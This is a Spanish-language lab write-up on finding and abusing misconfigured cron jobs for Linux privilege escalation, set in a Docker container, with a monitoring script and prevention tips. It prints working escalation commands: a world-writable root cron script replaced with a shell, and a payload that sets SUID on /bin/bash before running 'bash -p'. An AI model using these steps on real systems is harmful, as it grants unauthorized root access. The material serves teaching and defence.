
---
# Laboratorio: Detección y Explotación de Tareas Cron

## Introducción

Una tarea cron es un trabajo programado en sistemas Unix/Linux que se ejecuta en momentos determinados o en intervalos regulares. Estas tareas están definidas en archivos crontab, que especifican qué comandos deben ejecutarse y cuándo.

La detección y explotación de tareas cron es una técnica común en la escalada de privilegios, ya que una tarea cron mal configurada puede permitir la ejecución de código con privilegios elevados, generalmente del usuario `root`.

---

## Objetivo

Detectar tareas cron activas, revisar permisos de archivos relacionados, y aprovechar configuraciones inseguras para escalar privilegios.

---

## Despliegue y configuración inicial

Acción:

```bash
docker pull ubuntu:latest
docker run -dit --name cronLab ubuntu
docker exec -it cronLab bash
apt update && apt install -y cron nano wget
service cron start
````

Resultado:

```bash
root@<container_id>:/#
```

Explicación: Desplegamos un contenedor Ubuntu, instalamos cron y lo iniciamos para simular tareas programadas.

---

## Inspección de tareas cron existentes

Acción:

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/
crontab -l
```

Resultado:

Se listan las tareas programadas del sistema y del usuario root (u otros usuarios).

Explicación: Revisamos las tareas cron configuradas para detectar posibles scripts o comandos que se ejecutan regularmente.

---

## Creación de una tarea cron vulnerable para explotación

Acción:

```bash
echo -e '#!/bin/bash\ncp /root/flag.txt /tmp/flag.txt' > /usr/local/bin/cronjob.sh
chmod 755 /usr/local/bin/cronjob.sh
echo "* * * * * root /usr/local/bin/cronjob.sh" >> /etc/crontab
```

Resultado:

```bash
-rwxr-xr-x 1 root root 38 Jun 14 14:00 /usr/local/bin/cronjob.sh
```

Explicación: Creamos un script que copia un archivo sensible y lo configuramos para que cron lo ejecute cada minuto como root. Si un atacante puede modificar el script, puede ejecutar código arbitrario con privilegios elevados.

---

## Simulación de explotación: manipulando el script

Acción:

```bash
chmod 777 /usr/local/bin/cronjob.sh
echo -e '#!/bin/bash\n/bin/bash' > /usr/local/bin/cronjob.sh
```

Explicación: Damos permisos de escritura a otros usuarios (vulnerabilidad) y modificamos el script para lanzar una shell con privilegios root cuando se ejecute el cronjob.

---

## Monitorización de tareas con [[Pspy]]

Acción:

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

Resultado: Pspy muestra en tiempo real las tareas cron y comandos ejecutados en el sistema.

Explicación: Usamos pspy para detectar cuándo se ejecutan tareas cron, incluso si el usuario no tiene permisos de root ni acceso a los archivos cron.

---

## Script para monitorización de tareas cron

```bash
#!/bin/bash

# script para escanear tareas cron

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
  old_process=$new_process
done
```

Si descubriéramos un script que se ejecutara como tarea cron, con permisos de escritura y que fuera propietario de root y por tanto se ejecutara como root, podríamos modificar ese script y añadir esto:

```bas
#!/bin/bash

sleep 2
chmod u+s /bin/bash
```

De este modo cuando se ejecute la tarea cron y ejecute este script, asignará permisos SUID al binario `/bin/bash` por lo que elevaríamos privilegios haciendo:

```bash
bash -p
```

---

## Buenas prácticas para prevenir explotación de cron

- Limitar y auditar las tareas cron que se ejecutan en el sistema.
    
- Configurar permisos estrictos en scripts y archivos ejecutados por cron.
    
- Evitar tareas cron con permisos root a menos que sea estrictamente necesario.
    
- Monitorizar cambios y ejecución de tareas usando herramientas como Pspy.
    
- Configurar logs detallados para cron (`/var/log/syslog` o `/var/log/cron`).
    

---

## Referencias

- [Pspy en Github](https://github.com/DominicBreuker/pspy)
    

---


